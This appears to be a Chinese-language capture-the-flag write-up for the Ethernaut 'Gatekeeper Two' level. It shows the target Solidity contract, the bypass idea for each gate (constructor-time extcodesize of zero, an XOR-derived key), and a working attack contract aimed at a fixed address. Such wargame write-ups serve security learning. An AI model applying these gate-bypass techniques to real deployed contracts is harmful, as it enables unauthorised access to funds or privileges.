# Gatekeeper Two

> 这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## 攻击思路

- 对于gateOne，使用合约进行调用。
- 对于gateTwo，在合约在执行构造函数constructor时，此时合约的 size == 0；
- 对于gateThree，只需要进行一次按位运算即可算出_gateKey。

## 攻击代码

```solidity
contract Attack {
    GatekeeperTwo constant private target = GatekeeperTwo(0x700D90206161DB92fBEe91cd4aF7B72371089158);

    function getKey() public view returns (bytes8){
        uint64 _gateKey = ((uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        return bytes8(_gateKey);
    }

    function attack() public {
        bytes8 _gateKey = getKey();
        target.enter(_gateKey);
    }

    constructor() public {
        attack();
    }
}
```

